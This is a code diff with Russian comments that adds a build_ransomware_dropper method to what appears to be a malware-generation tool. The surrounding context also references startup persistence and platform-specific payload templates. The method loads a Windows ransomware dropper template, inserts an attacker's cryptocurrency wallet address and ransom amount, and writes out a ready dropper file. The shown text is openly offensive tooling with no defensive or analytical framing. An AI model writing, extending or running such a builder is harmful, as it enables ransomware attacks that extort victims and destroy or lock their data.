@@ -1086,6 +1086,24 @@ def add_to_startup():
             # Добавляем после импортов
             return template_code[:import_end] + macos_specific + template_code[import_end:]
 
+    def build_ransomware_dropper(self, wallet_address: str, ransom_amount: str = "0.05 BTC") -> Tuple[bool, str]:
+        """
+        Собирает ransomware dropper для Windows с заданным кошельком и суммой выкупа
+        """
+        try:
+            template_path = os.path.join(self.config["template_dir"], "ransomware_dropper_windows.py")
+            with open(template_path, 'r') as f:
+                template_code = f.read()
+            code = template_code.replace("{{WALLET_ADDRESS}}", wallet_address).replace("{{RANSOM_AMOUNT}}", ransom_amount)
+            out_dir = self.config["output_dir"]
+            os.makedirs(out_dir, exist_ok=True)
+            out_path = os.path.join(out_dir, f"ransomware_dropper_{wallet_address[:6]}.py")
+            with open(out_path, 'w') as f:
+                f.write(code)
+            return True, out_path
+        except Exception as e:
+            logger.error(f"Ошибка при сборке ransomware dropper: {e}")
+            return False, str(e)
 
 def main():
     """
